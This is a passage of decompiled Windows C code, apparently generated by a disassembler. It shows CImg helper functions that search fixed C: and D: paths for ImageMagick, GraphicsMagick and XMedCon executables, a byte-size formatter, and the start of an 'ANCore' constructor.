            v33 = fclose(v32);
            if ( v33 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v33);
          }
          v1 = 1;
        }
      }
      for ( nn = 32; nn >= 10; --nn )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%.2d-\\VISUA~1\\BIN\\%s.exe", nn);
        v35 = sub_41CE80(lpMultiByteStr, "r");
        if ( v35 )
        {
          if ( v35 != __acrt_iob_func(0) && v35 != __acrt_iob_func(1u) )
          {
            v36 = fclose(v35);
            if ( v36 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v36);
          }
          v1 = 1;
        }
      }
      for ( i1 = 9; i1 >= 0; --i1 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%d-Q\\VISUA~1\\BIN\\%s.exe", i1);
        v38 = sub_41CE80(lpMultiByteStr, "r");
        if ( v38 )
        {
          if ( v38 != __acrt_iob_func(0) && v38 != __acrt_iob_func(1u) )
          {
            v39 = fclose(v38);
            if ( v39 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v39);
          }
          v1 = 1;
        }
      }
      for ( i2 = 32; i2 >= 0; --i2 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"C:\\IMAGEM~1.%d\\VISUA~1\\BIN\\%s.exe", i2);
        v41 = sub_41CE80(lpMultiByteStr, "r");
        if ( v41 )
        {
          if ( v41 != __acrt_iob_func(0) && v41 != __acrt_iob_func(1u) )
          {
            v42 = fclose(v41);
            if ( v42 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v42);
          }
          v1 = 1;
        }
      }
      for ( i3 = 32; i3 >= 10; --i3 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%.2d-\\%s.exe", i3);
        v44 = sub_41CE80(lpMultiByteStr, "r");
        if ( v44 )
        {
          if ( v44 != __acrt_iob_func(0) && v44 != __acrt_iob_func(1u) )
          {
            v45 = fclose(v44);
            if ( v45 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v45);
          }
          v1 = 1;
        }
      }
      for ( i4 = 9; i4 >= 0; --i4 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%d-Q\\%s.exe", i4);
        v47 = sub_41CE80(lpMultiByteStr, "r");
        if ( v47 )
        {
          if ( v47 != __acrt_iob_func(0) && v47 != __acrt_iob_func(1u) )
          {
            v48 = fclose(v47);
            if ( v48 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v48);
          }
          v1 = 1;
        }
      }
      for ( i5 = 32; i5 >= 0; --i5 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%d\\%s.exe", i5);
        v50 = sub_41CE80(lpMultiByteStr, "r");
        if ( v50 )
        {
          if ( v50 != __acrt_iob_func(0) && v50 != __acrt_iob_func(1u) )
          {
            v51 = fclose(v50);
            if ( v51 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v51);
          }
          v1 = 1;
        }
      }
      for ( i6 = 32; i6 >= 10; --i6 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%.2d-\\VISUA~1\\BIN\\%s.exe", i6);
        v53 = sub_41CE80(lpMultiByteStr, "r");
        if ( v53 )
        {
          if ( v53 != __acrt_iob_func(0) && v53 != __acrt_iob_func(1u) )
          {
            v54 = fclose(v53);
            if ( v54 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v54);
          }
          v1 = 1;
        }
      }
      for ( i7 = 9; i7 >= 0; --i7 )
      {
        if ( v1 )
          break;
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%d-Q\\VISUA~1\\BIN\\%s.exe", i7);
        v56 = sub_41CE80(lpMultiByteStr, "r");
        if ( v56 )
        {
          if ( v56 != __acrt_iob_func(0) && v56 != __acrt_iob_func(1u) )
          {
            v57 = fclose(v56);
            if ( v57 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v57);
          }
          v1 = 1;
        }
      }
      v58 = 32;
      while ( !v1 )
      {
        sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"D:\\IMAGEM~1.%d\\VISUA~1\\BIN\\%s.exe", v58);
        v59 = sub_41CE80(lpMultiByteStr, "r");
        if ( v59 )
        {
          if ( v59 != __acrt_iob_func(0) && v59 != __acrt_iob_func(1u) )
          {
            v60 = fclose(v59);
            if ( v60 )
              sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v60);
          }
          v1 = 1;
        }
        if ( --v58 < 0 )
        {
          if ( !v1 )
            sub_41C190((int *)lpMultiByteStr, dword_5009E0, (int)"%s.exe", v70);
          break;
        }
      }
      v3 = v68 + 1;
      v68 = v3;
    }
    while ( v3 < 2 );
    v61 = lpMultiByteStr;
    if ( lpMultiByteStr && *lpMultiByteStr )
    {
      v62 = (CHAR *)unknown_libname_86(260);
      if ( GetShortPathNameA(v61, v62, 0x104u) )
      {
        v63 = v62;
        v64 = v61 - v62;
        do
        {
          v65 = *v63++;
          v63[v64 - 1] = v65;
        }
        while ( v65 );
      }
      j_j__free(v62);
    }
  }
  v66 = sub_41C6E0();
  ReleaseMutex((HANDLE)v66[7]);
  return lpMultiByteStr;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 5009E0: using guessed type int dword_5009E0;
// 5009E4: using guessed type int dword_5009E4;
// 5009E8: using guessed type int dword_5009E8;
// 5009EC: using guessed type int dword_5009EC;
// 5009F0: using guessed type char byte_5009F0;
// 500AD0: using guessed type int dword_500AD0;

//----- (0041E2E0) --------------------------------------------------------
LPCSTR sub_41E2E0()
{
  int *v0; // eax
  char v1; // bl
  LPSTR v2; // eax
  LPCSTR v3; // edx
  int v4; // esi
  FILE *v5; // edi
  int v6; // eax
  int i; // edi
  FILE *v8; // esi
  int v9; // eax
  int j; // edi
  FILE *v11; // esi
  int v12; // eax
  int k; // edi
  FILE *v14; // esi
  int v15; // eax
  int m; // edi
  FILE *v17; // esi
  int v18; // eax
  int n; // edi
  FILE *v20; // esi
  int v21; // eax
  int ii; // edi
  FILE *v23; // esi
  int v24; // eax
  int jj; // edi
  FILE *v26; // esi
  int v27; // eax
  int kk; // edi
  FILE *v29; // esi
  int v30; // eax
  int mm; // edi
  FILE *v32; // esi
  int v33; // eax
  int nn; // edi
  FILE *v35; // esi
  int v36; // eax
  int i1; // edi
  FILE *v38; // esi
  int v39; // eax
  int i2; // edi
  FILE *v41; // esi
  int v42; // eax
  int i3; // edi
  FILE *v44; // esi
  int v45; // eax
  int i4; // edi
  FILE *v47; // esi
  int v48; // eax
  int i5; // edi
  FILE *v50; // esi
  int v51; // eax
  int i6; // edi
  FILE *v53; // esi
  int v54; // eax
  int i7; // edi
  FILE *v56; // esi
  int v57; // eax
  int v58; // edi
  FILE *v59; // esi
  int v60; // eax
  LPCSTR v61; // ecx
  const CHAR *v62; // esi
  CHAR *v63; // edi
  CHAR *v64; // ecx
  int v65; // esi
  CHAR v66; // al
  int *v67; // eax
  int v69; // [esp+Ch] [ebp-4h]

  if ( dword_500AD4 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500AD4);
    if ( dword_500AD4 == -1 )
    {
      dword_500AB4 = 0;
      dword_500AB8 = 0;
      dword_500ABC = 0;
      dword_500AC0 = 0;
      byte_500AC4 = 0;
      dword_500AC8 = 0;
      atexit(sub_48DB60);
      _Init_thread_footer(&dword_500AD4);
    }
  }
  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[7], 0xFFFFFFFF);
  if ( !dword_500AC8 )
  {
    sub_422060((int)&dword_500AB4, 1024, 1, 1, 1);
    v1 = 0;
    v2 = sub_41D6C0();
    v3 = dword_500AC8;
    v4 = (int)v2;
    v69 = (int)v2;
    *(_QWORD *)dword_500AC8 = 0x6578652E6D675C2Ei64;
    *((_BYTE *)v3 + 8) = 0;
    v5 = sub_41CE80(dword_500AC8, "r");
    if ( v5 )
    {
      if ( v5 != __acrt_iob_func(0) && v5 != __acrt_iob_func(1u) )
      {
        v6 = fclose(v5);
        if ( v6 )
          sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v6);
      }
      v1 = 1;
    }
    for ( i = 32; i >= 10; --i )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%.2d-\\gm.exe", v4);
      v8 = sub_41CE80(dword_500AC8, "r");
      if ( v8 )
      {
        if ( v8 != __acrt_iob_func(0) && v8 != __acrt_iob_func(1u) )
        {
          v9 = fclose(v8);
          if ( v9 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v9);
        }
        v1 = 1;
      }
      v4 = v69;
    }
    for ( j = 9; j >= 0; --j )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%d-Q\\gm.exe", v4);
      v11 = sub_41CE80(dword_500AC8, "r");
      if ( v11 )
      {
        if ( v11 != __acrt_iob_func(0) && v11 != __acrt_iob_func(1u) )
        {
          v12 = fclose(v11);
          if ( v12 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v12);
        }
        v1 = 1;
      }
      v4 = v69;
    }
    for ( k = 32; k >= 0; --k )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%d\\gm.exe", v69);
      v14 = sub_41CE80(dword_500AC8, "r");
      if ( v14 )
      {
        if ( v14 != __acrt_iob_func(0) && v14 != __acrt_iob_func(1u) )
        {
          v15 = fclose(v14);
          if ( v15 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v15);
        }
        v1 = 1;
      }
    }
    for ( m = 32; m >= 10; --m )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%.2d-\\VISUA~1\\BIN\\gm.exe", v69);
      v17 = sub_41CE80(dword_500AC8, "r");
      if ( v17 )
      {
        if ( v17 != __acrt_iob_func(0) && v17 != __acrt_iob_func(1u) )
        {
          v18 = fclose(v17);
          if ( v18 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v18);
        }
        v1 = 1;
      }
    }
    for ( n = 9; n >= 0; --n )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%d-Q\\VISUA~1\\BIN\\gm.exe", v69);
      v20 = sub_41CE80(dword_500AC8, "r");
      if ( v20 )
      {
        if ( v20 != __acrt_iob_func(0) && v20 != __acrt_iob_func(1u) )
        {
          v21 = fclose(v20);
          if ( v21 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v21);
        }
        v1 = 1;
      }
    }
    for ( ii = 32; ii >= 0; --ii )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"%s\\GRAPHI~1.%d\\VISUA~1\\BIN\\gm.exe", v69);
      v23 = sub_41CE80(dword_500AC8, "r");
      if ( v23 )
      {
        if ( v23 != __acrt_iob_func(0) && v23 != __acrt_iob_func(1u) )
        {
          v24 = fclose(v23);
          if ( v24 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v24);
        }
        v1 = 1;
      }
    }
    for ( jj = 32; jj >= 10; --jj )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%.2d-\\gm.exe", jj);
      v26 = sub_41CE80(dword_500AC8, "r");
      if ( v26 )
      {
        if ( v26 != __acrt_iob_func(0) && v26 != __acrt_iob_func(1u) )
        {
          v27 = fclose(v26);
          if ( v27 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v27);
        }
        v1 = 1;
      }
    }
    for ( kk = 9; kk >= 0; --kk )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%d-Q\\gm.exe", kk);
      v29 = sub_41CE80(dword_500AC8, "r");
      if ( v29 )
      {
        if ( v29 != __acrt_iob_func(0) && v29 != __acrt_iob_func(1u) )
        {
          v30 = fclose(v29);
          if ( v30 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v30);
        }
        v1 = 1;
      }
    }
    for ( mm = 32; mm >= 0; --mm )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%d\\gm.exe", mm);
      v32 = sub_41CE80(dword_500AC8, "r");
      if ( v32 )
      {
        if ( v32 != __acrt_iob_func(0) && v32 != __acrt_iob_func(1u) )
        {
          v33 = fclose(v32);
          if ( v33 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v33);
        }
        v1 = 1;
      }
    }
    for ( nn = 32; nn >= 10; --nn )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%.2d-\\VISUA~1\\BIN\\gm.exe", nn);
      v35 = sub_41CE80(dword_500AC8, "r");
      if ( v35 )
      {
        if ( v35 != __acrt_iob_func(0) && v35 != __acrt_iob_func(1u) )
        {
          v36 = fclose(v35);
          if ( v36 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v36);
        }
        v1 = 1;
      }
    }
    for ( i1 = 9; i1 >= 0; --i1 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%d-Q\\VISUA~1\\BIN\\gm.exe", i1);
      v38 = sub_41CE80(dword_500AC8, "r");
      if ( v38 )
      {
        if ( v38 != __acrt_iob_func(0) && v38 != __acrt_iob_func(1u) )
        {
          v39 = fclose(v38);
          if ( v39 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v39);
        }
        v1 = 1;
      }
    }
    for ( i2 = 32; i2 >= 0; --i2 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"C:\\GRAPHI~1.%d\\VISUA~1\\BIN\\gm.exe", i2);
      v41 = sub_41CE80(dword_500AC8, "r");
      if ( v41 )
      {
        if ( v41 != __acrt_iob_func(0) && v41 != __acrt_iob_func(1u) )
        {
          v42 = fclose(v41);
          if ( v42 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v42);
        }
        v1 = 1;
      }
    }
    for ( i3 = 32; i3 >= 10; --i3 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%.2d-\\gm.exe", i3);
      v44 = sub_41CE80(dword_500AC8, "r");
      if ( v44 )
      {
        if ( v44 != __acrt_iob_func(0) && v44 != __acrt_iob_func(1u) )
        {
          v45 = fclose(v44);
          if ( v45 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v45);
        }
        v1 = 1;
      }
    }
    for ( i4 = 9; i4 >= 0; --i4 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%d-Q\\gm.exe", i4);
      v47 = sub_41CE80(dword_500AC8, "r");
      if ( v47 )
      {
        if ( v47 != __acrt_iob_func(0) && v47 != __acrt_iob_func(1u) )
        {
          v48 = fclose(v47);
          if ( v48 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v48);
        }
        v1 = 1;
      }
    }
    for ( i5 = 32; i5 >= 0; --i5 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%d\\gm.exe", i5);
      v50 = sub_41CE80(dword_500AC8, "r");
      if ( v50 )
      {
        if ( v50 != __acrt_iob_func(0) && v50 != __acrt_iob_func(1u) )
        {
          v51 = fclose(v50);
          if ( v51 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v51);
        }
        v1 = 1;
      }
    }
    for ( i6 = 32; i6 >= 10; --i6 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%.2d-\\VISUA~1\\BIN\\gm.exe", i6);
      v53 = sub_41CE80(dword_500AC8, "r");
      if ( v53 )
      {
        if ( v53 != __acrt_iob_func(0) && v53 != __acrt_iob_func(1u) )
        {
          v54 = fclose(v53);
          if ( v54 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v54);
        }
        v1 = 1;
      }
    }
    for ( i7 = 9; i7 >= 0; --i7 )
    {
      if ( v1 )
        break;
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%d-Q\\VISUA~1\\BIN\\gm.exe", i7);
      v56 = sub_41CE80(dword_500AC8, "r");
      if ( v56 )
      {
        if ( v56 != __acrt_iob_func(0) && v56 != __acrt_iob_func(1u) )
        {
          v57 = fclose(v56);
          if ( v57 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v57);
        }
        v1 = 1;
      }
    }
    v58 = 32;
    while ( !v1 )
    {
      sub_41C190((int *)dword_500AC8, dword_500AB4, (int)"D:\\GRAPHI~1.%d\\VISUA~1\\BIN\\gm.exe", v58);
      v59 = sub_41CE80(dword_500AC8, "r");
      if ( v59 )
      {
        if ( v59 != __acrt_iob_func(0) && v59 != __acrt_iob_func(1u) )
        {
          v60 = fclose(v59);
          if ( v60 )
            sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v60);
        }
        v1 = 1;
      }
      if ( --v58 < 0 )
      {
        if ( !v1 )
        {
          v61 = dword_500AC8;
          *(_DWORD *)dword_500AC8 = 1697541479;
          strcpy((char *)v61 + 4, "xe");
        }
        break;
      }
    }
    v62 = dword_500AC8;
    if ( dword_500AC8 && *dword_500AC8 )
    {
      v63 = (CHAR *)unknown_libname_86(260);
      if ( GetShortPathNameA(v62, v63, 0x104u) )
      {
        v64 = v63;
        v65 = v62 - v63;
        do
        {
          v66 = *v64++;
          v64[v65 - 1] = v66;
        }
        while ( v66 );
      }
      j_j__free(v63);
    }
  }
  v67 = sub_41C6E0();
  ReleaseMutex((HANDLE)v67[7]);
  return dword_500AC8;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 500AB4: using guessed type int dword_500AB4;
// 500AB8: using guessed type int dword_500AB8;
// 500ABC: using guessed type int dword_500ABC;
// 500AC0: using guessed type int dword_500AC0;
// 500AC4: using guessed type char byte_500AC4;
// 500AD4: using guessed type int dword_500AD4;

//----- (0041ED40) --------------------------------------------------------
LPCSTR sub_41ED40()
{
  int *v0; // eax
  LPSTR v1; // eax
  LPCSTR v2; // edx
  int v3; // edi
  FILE *v4; // esi
  int v5; // eax
  LPCSTR v6; // ecx
  LPCSTR v7; // ecx
  int *v8; // eax

  if ( dword_500ACC > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500ACC);
    if ( dword_500ACC == -1 )
    {
      dword_500ADC = 0;
      dword_500AE0 = 0;
      dword_500AE4 = 0;
      dword_500AE8 = 0;
      byte_500AEC = 0;
      lpszLongPath = 0;
      atexit(sub_48DB80);
      _Init_thread_footer(&dword_500ACC);
    }
  }
  v0 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v0[7], 0xFFFFFFFF);
  if ( !lpszLongPath )
  {
    sub_422060((int)&dword_500ADC, 1024, 1, 1, 1);
    v1 = sub_41D6C0();
    v2 = lpszLongPath;
    v3 = (int)v1;
    *(_QWORD *)lpszLongPath = 0x6E6F6364656D5C2Ei64;
    strcpy((char *)v2 + 8, ".exe");
    v4 = sub_41CE80(lpszLongPath, "r");
    if ( v4 )
      goto LABEL_18;
    sub_41C190((int *)lpszLongPath, dword_500ADC, (int)"%s\\XMedCon\\bin\\medcon.bat", v3);
    v4 = sub_41CE80(lpszLongPath, "r");
    if ( v4
      || (sub_41C190((int *)lpszLongPath, dword_500ADC, (int)"%s\\XMedCon\\bin\\medcon.exe", v3),
          (v4 = sub_41CE80(lpszLongPath, "r")) != 0)
      || (v6 = lpszLongPath,
          *(_OWORD *)lpszLongPath = xmmword_4E97A4,
          strcpy((char *)v6 + 16, "edcon.exe"),
          (v4 = sub_41CE80(lpszLongPath, "r")) != 0) )
    {
LABEL_18:
      if ( v4 != __acrt_iob_func(0) && v4 != __acrt_iob_func(1u) )
      {
        v5 = fclose(v4);
        if ( v5 )
          sub_41C800((int)"cimg::fclose(): Error code %d returned during file closing.", v5);
      }
    }
    else
    {
      v7 = lpszLongPath;
      *(_QWORD *)lpszLongPath = 0x652E6E6F6364656Di64;
      strcpy((char *)v7 + 8, "xe");
    }
    sub_41C8C0(lpszLongPath);
  }
  v8 = sub_41C6E0();
  ReleaseMutex((HANDLE)v8[7]);
  return lpszLongPath;
}
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4E97A4: using guessed type __int128 xmmword_4E97A4;
// 500ACC: using guessed type int dword_500ACC;
// 500ADC: using guessed type int dword_500ADC;
// 500AE0: using guessed type int dword_500AE0;
// 500AE4: using guessed type int dword_500AE4;
// 500AE8: using guessed type int dword_500AE8;
// 500AEC: using guessed type char byte_500AEC;

//----- (0041EF70) --------------------------------------------------------
void *__fastcall sub_41EF70(unsigned int a1)
{
  int *v2; // eax
  float v3; // xmm0_4
  int *v4; // eax
  int v6; // [esp-4h] [ebp-20h]
  int v7; // [esp+0h] [ebp-1Ch]
  int v8; // [esp+4h] [ebp-18h]

  if ( dword_500C20 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500C20);
    if ( dword_500C20 == -1 )
    {
      sub_422290(dword_500C44, 256, v6, v7, v8);
      atexit(sub_48DBA0);
      _Init_thread_footer(&dword_500C20);
    }
  }
  v2 = sub_41C6E0();
  WaitForSingleObject((HANDLE)v2[5], 0xFFFFFFFF);
  if ( a1 >= 0x400 )
  {
    v3 = (float)a1;
    if ( a1 >= 0x100000 )
    {
      if ( a1 >= 0x40000000 )
        sub_41C190(
          (int *)dword_500C58,
          dword_500C44[0],
          (int)"%.1f Gio",
          COERCE_UNSIGNED_INT64((float)(v3 * 9.3132257e-10)));
      else
        sub_41C190(
          (int *)dword_500C58,
          dword_500C44[0],
          (int)"%.1f Mio",
          COERCE_UNSIGNED_INT64((float)(v3 * 0.00000095367432)));
    }
    else
    {
      sub_41C190(
        (int *)dword_500C58,
        dword_500C44[0],
        (int)"%.1f Kio",
        COERCE_UNSIGNED_INT64((float)(v3 * 0.0009765625)));
    }
  }
  else
  {
    sub_41C190((int *)dword_500C58, dword_500C44[0], (int)"%lu byte%s", a1);
  }
  v4 = sub_41C6E0();
  ReleaseMutex((HANDLE)v4[5]);
  return dword_500C58;
}
// 41EFD4: variable 'v6' is possibly undefined
// 41EFD4: variable 'v7' is possibly undefined
// 41EFD4: variable 'v8' is possibly undefined
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 500C20: using guessed type int dword_500C20;
// 500C44: using guessed type int dword_500C44[4];

//----- (0041F0D0) --------------------------------------------------------
int __thiscall sub_41F0D0(char *this, int a2, int a3, _DWORD *Src, _DWORD *a5, void *a6)
{
  _DWORD *v6; // ecx
  int v7; // esi
  char *v8; // edi
  int v9; // eax
  _OWORD *v10; // eax
  volatile signed __int32 *v11; // esi
  int v12; // edx
  int *v13; // ecx
  int v14; // esi
  int v15; // edx
  int v16; // eax
  int v17; // eax
  _QWORD *v18; // eax
  volatile signed __int32 *v19; // esi
  int v20; // edx
  int *v21; // ecx
  int *v22; // eax
  int v23; // edi
  int v24; // esi
  int *v25; // ecx
  int v26; // ecx
  int result; // eax
  int v28; // [esp+10h] [ebp-68h] BYREF
  int v29; // [esp+14h] [ebp-64h]
  volatile signed __int32 *v30; // [esp+18h] [ebp-60h]
  char *v31; // [esp+1Ch] [ebp-5Ch]
  char *v32; // [esp+20h] [ebp-58h]
  void *Block; // [esp+24h] [ebp-54h]
  void *v34; // [esp+28h] [ebp-50h]
  int v35[2]; // [esp+2Ch] [ebp-4Ch] BYREF
  char v36; // [esp+34h] [ebp-44h]
  int *v37; // [esp+38h] [ebp-40h]
  int *v38; // [esp+50h] [ebp-28h]
  void **v39; // [esp+54h] [ebp-24h] BYREF
  int v40; // [esp+58h] [ebp-20h]
  int v41[2]; // [esp+5Ch] [ebp-1Ch] BYREF
  int v42; // [esp+64h] [ebp-14h]
  int v43; // [esp+74h] [ebp-4h]

  v31 = this;
  Block = a6;
  sub_40F4B0((int)this);
  v43 = 0;
  v6 = v31;
  *((_DWORD *)v31 + 9) = a2;
  *v6 = &ANCore::`vftable';
  v6[8] = 0;
  v6[10] = a3;
  sub_4055B0(v6 + 11, Src);
  v7 = (int)v31;
  sub_4055B0((_DWORD *)v31 + 17, a5);
  sub_4055B0((_DWORD *)v31 + 23, Block);
  v8 = v31 + 24;
  v34 = v31 + 116;
  Block = operator new(0xFCu);
  LOBYTE(v43) = 4;
  memset(Block, 0, 0xFCu);
  v9 = *((_DWORD *)v31 + 7);
  if ( v9 )
    _InterlockedIncrement((volatile signed __int32 *)(v9 + 4));
  *((_DWORD *)v31 + 29) = sub_410850((int *)Block, *(_DWORD *)v8, *((volatile signed __int32 **)v31 + 7));
  LOBYTE(v43) = 5;
  v34 = (void *)(v7 + 120);
  v10 = operator new(0x20u);
  Block = v10;
  *v10 = 0i64;
  v10[1] = 0i64;
  v11 = *(volatile signed __int32 **)(v7 + 28);
  if ( v11 )
  {
    _InterlockedIncrement(v11 + 1);
    v11 = (volatile signed __int32 *)*((_DWORD *)v8 + 1);
  }
  v12 = *(_DWORD *)v8;
  v29 = *(_DWORD *)v8;
  v30 = v11;
  LOBYTE(v43) = 7;
  if ( v11 )
    _InterlockedIncrement(v11 + 1);
  sub_40F700(v10, v12, v11, 3);
  LOBYTE(v43) = 8;
  v13 = (int *)Block;
  *(_DWORD *)Block = &ANSystemModule::`vftable';
  v13[6] = 0;
  sub_41A350(v13);
  if ( v11 )
  {
    if ( !_InterlockedExchangeAdd(v11 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v11)(v11);
      if ( !_InterlockedExchangeAdd(v11 + 2, 0xFFFFFFFF) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v11 + 4))(v11);
    }
  }
  *(_DWORD *)v34 = Block;
  v14 = (int)v31;
  sub_42B6F0((_DWORD *)v31 + 31, (int *)v8);
  v32 = v31 + 128;
  v34 = operator new(0x84u);
  LOBYTE(v43) = 11;
  memset(v34, 0, 0x84u);
  v16 = *((_DWORD *)v8 + 1);
  if ( v16 )
    _InterlockedIncrement((volatile signed __int32 *)(v16 + 4));
  *((_DWORD *)v31 + 32) = sub_414FE0((int)v34, v15, *(_DWORD *)v8, *((volatile signed __int32 **)v8 + 1));
  v32 = (char *)(v14 + 132);
  v34 = operator new(0x60u);
  LOBYTE(v43) = 13;
  memset(v34, 0, 0x60u);
  v17 = *((_DWORD *)v8 + 1);
  if ( v17 )
    _InterlockedIncrement((volatile signed __int32 *)(v17 + 4));
  *(_DWORD *)(v14 + 132) = sub_413310((int)v34, *(_DWORD *)v8, *((volatile signed __int32 **)v8 + 1));
  LOBYTE(v43) = 14;
  v34 = (void *)(v14 + 136);
  v18 = operator new(0x18u);
  Block = v18;
  *(_OWORD *)v18 = 0i64;
  v18[2] = 0i64;
  v19 = (volatile signed __int32 *)*((_DWORD *)v8 + 1);
  if ( v19 )
  {
    _InterlockedIncrement(v19 + 1);
    v19 = (volatile signed __int32 *)*((_DWORD *)v8 + 1);
  }
  v20 = *(_DWORD *)v8;
  v29 = *(_DWORD *)v8;
  v30 = v19;
  LOBYTE(v43) = 16;
  if ( v19 )
    _InterlockedIncrement(v19 + 1);
  sub_40F700(v18, v20, v19, 7);
  v21 = (int *)Block;
  v36 = v29;
  v35[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)Block = &ANNetworkModule::`vftable';
  v35[1] = (int)sub_419390;
  v37 = v21;
  v38 = v35;
  LOBYTE(v43) = 18;
  sub_40FA20(v21, 35, (int)v35);
  if ( v38 )
  {
    v22 = v35;
    LOBYTE(v22) = v38 != v35;
    (*(void (__stdcall **)(int *))(*v38 + 16))(v22);
    v38 = 0;
  }
  if ( v19 )
  {
    if ( !_InterlockedExchangeAdd(v19 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v19)(v19);
      if ( !_InterlockedDecrement(v19 + 2) )
